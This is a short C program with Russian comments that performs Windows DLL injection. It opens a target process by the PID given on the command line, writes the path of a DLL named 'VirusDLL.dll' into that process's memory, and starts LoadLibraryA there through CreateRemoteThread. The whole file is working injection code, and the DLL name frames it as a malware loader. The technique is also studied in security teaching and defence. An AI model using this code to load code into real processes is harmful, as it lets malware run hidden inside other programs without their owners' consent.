
#include <Windows.h>
#include <winerror.h>

#include <stdio.h>

int main(int argc, char* argv[])
{
    char szDLLPathToInject[] = { "VirusDLL.dll" };
    int nDLLPathLen = lstrlenA(szDLLPathToInject);
    int nTotBytesToAllocate = nDLLPathLen + 1; // включая завершающий нулевой символ.

    // 0. Открываем процесс.
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, atoi(argv[1]));

    // 1. Выделяем память в удалённом процессе.
    LPVOID lpHeapBaseAddress1 = VirtualAllocEx(hProcess, NULL, nTotBytesToAllocate, MEM_COMMIT, PAGE_READWRITE);

    // 2. Записываем путь к DLL в выделенную память удалённого процесса.
    SIZE_T lNumberOfBytesWritten = 0;
    WriteProcessMemory(hProcess, lpHeapBaseAddress1, szDLLPathToInject, nTotBytesToAllocate, &lNumberOfBytesWritten);

    // 3.0. Получаем адрес функции LoadLibraryA из Kernel32.dll.
    LPTHREAD_START_ROUTINE lpLoadLibraryStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryA");

    // 3.1. Вызываем LoadLibraryA в удалённом процессе, передавая адрес памяти с путём к DLL.
    CreateRemoteThread(hProcess, NULL, 0, lpLoadLibraryStartAddress, lpHeapBaseAddress1, 0, NULL);

    CloseHandle(hProcess);
    return 0;
}